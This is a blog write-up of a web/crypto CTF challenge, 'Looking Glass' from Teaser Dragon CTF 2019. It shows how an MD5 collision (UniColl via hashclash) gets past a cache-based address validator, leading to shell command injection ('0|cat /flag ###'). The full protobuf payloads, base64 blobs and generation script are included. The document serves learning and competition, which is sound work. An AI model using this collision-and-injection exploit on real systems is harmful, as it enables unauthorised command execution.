---
layout: post
title:  "Teaser Dragon CTF 2019"
date:   2019-09-22 19:00:00 +0100
categories: writeups ctf
toc:    false
---

This weekend I participated with my team WreckTheLine in Teaser Dragon Sector CTF. I only had the opportunity to work on the Looking Glass challenge, so here's a short writeup. We didn't quite make it in time to submit the flag. My solution was 5 minutes late because of a mistake I made in the payload.

Looking glass - Web / Cryptography, 330
===========

![challenge](/assets/images/dragonctf2019/challenge.png)

This was the challenge description. From the get go we get the idea that the flag might be at `/flag`. We also get a website and source code.

![page](/assets/images/dragonctf2019/page.png)

This is the page. You can basically use `traceroute` or `ping` with those parameters. Maybe a RCE?

I downloaded the source code. It uses protobuf for the client-server communication. Diving deeper we see how it executes `ping` and `traceroute` on line 83.

```go
switch c := cmd.Command.(type) {
case *Command_PingCommand:
    commandline = fmt.Sprintf("ping -%d -c %d %s", c.PingCommand.GetIpVersion(), c.PingCommand.GetCount(), c.PingCommand.GetAddress())
case *Command_TracerouteCommand:
    commandline = fmt.Sprintf("traceroute -%d %s", c.TracerouteCommand.GetIpVersion(), c.TracerouteCommand.GetAddress())
}
// --snip--
e := exec.CommandContext(ctx, "/bin/sh", "-c", commandline)
```

From this I got the idea that I can use the address somehow to achieve RCE. Seems pretty straight forward for now. Well not so easy.

The code is checking so that the address only contains the following charset `a-z0-9.`. Pretty restrictive.

```go
func (v *validator) Valid(data []byte) *Command {
    if len(data) > 270 {
        return nil
    }

    key := md5bytes(data)
    v.lock.Lock()
    defer v.lock.Unlock()

    var cmd Command
    if err := proto.Unmarshal(data, &cmd); err != nil {
        return nil
    }

    var address string
    switch c := cmd.Command.(type) {
    case *Command_PingCommand:
        address = c.PingCommand.GetAddress()
    case *Command_TracerouteCommand:
        address = c.TracerouteCommand.GetAddress()
    }

    valid, ok := v.cache.Get(key)
    if ok && valid.(bool) {
        return &cmd
    } else if checkAddress(address) {
        v.cache.Add(key, true)
        return &cmd
    }
    return nil
}
```

The thing is, we can see a loophole. `v.cache` is a LRU Cache mechanism, based on the md5 of the protobuf data we are sending in. That's quite interesting, considering how easy md5 collision are these day.

Well, first I had to understand the protobuf protocol. And it is quite simple. It's basically one byte for field id and field type. One byte for length. And then the data. It fails if you estimate to have more data. And it has unexpected results if you estimate less data (mostly fails).

I used [https://protogen.marcgravell.com/decode](https://protogen.marcgravell.com/decode) to play with protobuf and understand how it works.

`0A-10-0A-0A-67-6F-6F-67-6C-65-2E-63-6F-6D-10-01-18-04` is a payload for `ping` with `google.com` as address.

```
EXPLANATION
==============
0A = field 1, type String - for ping. we have a different one for traceroute
10 = length 16
payload = 0A-0A-67-6F-6F-67-6C-65-2E-63-6F-6D-10-01-18-04
UTF8: google.com\x10\x01\x18\x04

    0A = field 1, type String
    0A = length 10
    payload = 67-6F-6F-67-6C-65-2E-63-6F-6D
    UTF8: google.com

    10 = field 2, type Variant
    01 = 1 (raw) - ping count

    18 = field 3, type Variant
    04 = 4 (raw) - ipv4 or ipv6
```

We can disconsider `field 2` and `field 3` as they have defaults (ping count 1, ipv4). A valid payload without those would be `0A-0C-0A-0A-67-6F-6F-67-6C-65-2E-63-6F-6D`.

After some tinkering with the app I discovered I could create another field that is not in any way interpreted by the app (field 4, 5, 6...) and use it to store arbitrary data. That comes in handy for md5 collisions which requires some text to be added. I used `2A` for `field 5, type String` and created the following payload `0A-12-0A-0A-67-6F-6F-67-6C-65-2E-63-6F-6D-2A-04-54-45-53-54` which contains `google.com` for ping and `TEST` as an arbitrary text. `TEST` is completely ignored by the app.

I also discovered that if we have the same field twice in our protobuf, the app only considers the last definition for that field. That comes into play later.

We now have a good understanding of how to tinker with protobuf protocol. Following this, we need to understand md5 collisions. I'll spare you the time involved in reading a lot about the subject and go closer to the end.

We discovered a great article on md5 collisions [https://github.com/corkami/collisions](https://github.com/corkami/collisions). It's insanely good and covers everything.

Basically there are two different attacks. Identical-Prefix Collision and Chosen-Prefix Collision. There's a good explanation for the first one at [https://natmchugh.blogspot.com/2014/10/how-i-made-two-php-files-with-same-md5.html](https://natmchugh.blogspot.com/2014/10/how-i-made-two-php-files-with-same-md5.html).

We tried Chosen-Prefix Collision with two different payloads (one good, one evil). We tried [hashclash](https://github.com/cr-marcstevens/hashclash). It took 2 hours and the final payload's length wasn't predictible. So I couldn't set a reliable length for it and the protobuf would fail.

After a while I finally understood how [UniColl](https://github.com/corkami/collisions#unicoll-md5) works and gave it a try. It basically uses your prefix, modifies predictably the 10th byte, and results in a predictable length (128 bytes from 12 bytes prefix). I can append another payload at the end and it would still have the same hashsum. Marvelous.

So because it is changing the 10th byte, I could have the length there. After using UniColl I would get two payloads, with that length differing from one another. And append at the end a payload that would act as an ignored field for the good payload and act as the address for the evil payload.

```
PREFIX
0A-AA-01-0A-03-30-30-30-2A-77-00-00

SUFFIX
0A-0A-2A-20-30-7C-63-61-74-20-2F-66-6C-61-67-20-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-2A-07-23-23-23-23-23-23-23
```

And in between we had `128 - 12 = 116 chars` of data for the md5 collision. _Ignore the first `0A` in the suffix, that was a mistake._

I used `0|cat /flag ###` for the address in the evil payload. This was a bit of a bet because I wasn't sure the flag would be there. Considering the hint and that it takes `~5 minutes` to generate another collision, I hoped it was there.

I tested with the `00` in between to validate the payloads.

```
Good - Valid Ping - 0x78 length
0A-AA-01-0A-03-30-30-30-2A-78-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-0A-0A-2A-20-30-7C-63-61-74-20-2F-66-6C-61-67-20-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-2A-07-23-23-23-23-23-23-23

Evil - RCE cat /flag - 0x77 length
0A-AA-01-0A-03-30-30-30-2A-77-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-0A-0A-2A-20-30-7C-63-61-74-20-2F-66-6C-61-67-20-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-23-2A-07-23-23-23-23-23-23-23
```

You can check them both at [https://protogen.marcgravell.com/decode](https://protogen.marcgravell.com/decode) and notice that the only difference is the 10th byte. It's very important after we have the collision to use first the one with `0x78` on the 10th byte, and then the other one.

We use hashclash with Identical-Prefix Collision (UniColl) to get the two collisions.


```sh
cd hashclash

mkdir ipc_workdir
cd ipc_workdir

# PREFIX
echo CqoBCgMwMDAqdwAA | base64 -d > prefix.txt
../scripts/poc_no.sh prefix.txt

cp collision1.bin col1.bin
cp collision2.bin col2.bin

# append SUFFIX
echo CgoqIDB8Y2F0IC9mbGFnICMjIyMjIyMjIyMjIyMjIyMjIyMjKgcjIyMjIyMj | base64 -d >> col1.bin
echo CgoqIDB8Y2F0IC9mbGFnICMjIyMjIyMjIyMjIyMjIyMjIyMjKgcjIyMjIyMj | base64 -d >> col2.bin

echo '=============='
xxd col1.bin | head -n1
base64 -w0 col1.bin; echo
echo '=============='
xxd col2.bin | head -n1
base64 -w0 col2.bin; echo
echo '=============='
```

And the results are in after 4-5 minutes.

```sh
$ md5sum col?.bin
d7b627375239482857cedfdecf04c620  col1.bin
d7b627375239482857cedfdecf04c620  col2.bin
$ sha1sum col?.bin
42febf8030bc156bb7c8cf0f050b816444f171eb  col1.bin
32c34d3bb8148a63cad15840204f09500c47bdce  col2.bin

$ xxd col1.bin | head -n1
0000000: 0aaa 010a 0330 3030 2a77 0000 300e fda5  .....000*w..0...
$ base64 -w0 col1.bin; echo
CqoBCgMwMDAqdwAAMA79pSe8lgpa6ifpUIOGpafTRTOtiv+9SDPK3I9FdY9nFO2fUXU+o7tyT2SlixXpA/rfERLmZSAfJo0ytLjgP038ZU+rj/0WQALIobKHHX5nKLRTiFEwR4sVN8ofy57pGll7SCzymhiL7d0xv6Kf9yhvo8cKCiogMHxjYXQgL2ZsYWcgIyMjIyMjIyMjIyMjIyMjIyMjIyMqByMjIyMjIyM=

$ xxd col2.bin | head -n1
0000000: 0aaa 010a 0330 3030 2a78 0000 300e fda5  .....000*x..0...
$ base64 -w0 col2.bin; echo
CqoBCgMwMDAqeAAAMA79pSe8lgpa6ifpUIOGpafTRTOtiv+9SDPK3I9FdY9nFO2fUXU+o7tyT2SlixXpA/rfERLmZSAfJo0ytLfgP038ZU+rj/0WQALIobKHHX5nKLRTiFEwR4sVN8ofy57pGll7SCzymhiL7d0xv6Kf9yhvo8cKCiogMHxjYXQgL2ZsYWcgIyMjIyMjIyMjIyMjIyMjIyMjIyMqByMjIyMjIyM=
```

I got here 2 minutes after the ctf ended. And I send the wrong payload first, and the good one second because of the rush of adrenaline. And I couldn't figure out why it doesn't work. After 5 minutes and I figured it out and sent them in the right order, the good payload got cached and the RCE from the evil payload got executed.

![flag](/assets/images/dragonctf2019/flag.png)

It was a great challenge in which I learned a ton. Cheers to Dragon Sector for organizing it.
